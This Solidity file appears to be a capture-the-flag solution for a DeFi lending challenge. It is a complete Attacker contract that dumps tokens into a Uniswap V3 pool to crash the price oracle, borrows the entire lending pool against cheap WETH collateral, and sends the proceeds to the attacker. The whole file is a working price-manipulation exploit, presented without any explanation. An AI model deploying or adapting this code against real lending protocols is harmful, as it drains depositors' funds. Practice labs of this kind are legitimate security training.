// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {IUniswapV3Pool, ISwapRouter} from "./interfaces.sol";

interface IWETH {
    function approve(address, uint256) external returns (bool);

    function withdraw(uint256) external;

    function balanceOf(address) external view returns (uint256);
}

interface ILendingPool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 amount) external view returns (uint256);
}

contract Attacker {
    ISwapRouter immutable router;
    ILendingPool immutable pool;
    IERC20 immutable token;
    IWETH immutable weth;

    address payable immutable attacker;

    constructor(address _router, address _pool, address _token, address _weth) {
        router = ISwapRouter(_router);
        pool = ILendingPool(_pool);
        token = IERC20(_token);
        weth = IWETH(_weth);

        attacker = payable(msg.sender);
    }

    function movePrice() external {
        require(msg.sender == attacker, "Access_Denied");
        uint256 amount = token.balanceOf(attacker);

        //transfer attacker token to this Attacker contract
        token.transferFrom(attacker, address(this), amount);

        //approves DVT amount to the router inorder to swap the amount
        token.approve(address(router), amount);

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(
            address(token), address(weth), 3000, address(this), block.timestamp + 3, amount, 0, 0
        );

        //swaps all the DVT tokens for WETH in the pool
        router.exactInputSingle(params);
    }

    function borrowFromPoolAtCheap() external {
        require(msg.sender == attacker, "Access_Denied");

        uint256 poolBalance = token.balanceOf(address(pool));

        //amount of weth required to borrow all the DVT tokens in lending pool
        uint256 wethAmount = pool.calculateDepositOfWETHRequired(poolBalance);

        //approves weth to the lending pool
        weth.approve(address(pool), wethAmount);

        //calls the borrow function on lending pool with the said amount
        pool.borrow(poolBalance);

        uint256 tokenAmount = token.balanceOf(address(this));
        // if eveything goes right the attacker address will be transferred all the
        // lending pool tokens and the lending pool will be empty
        token.transfer(attacker, tokenAmount);
    }

    function sweepExtraWeth() external {
        require(msg.sender == attacker, "Access_Denied");

        uint256 wethAmount = weth.balanceOf(address(this));
        weth.withdraw(wethAmount);

        //send the remaining WETH to the attacker address
        attacker.transfer(address(this).balance);
    }
}
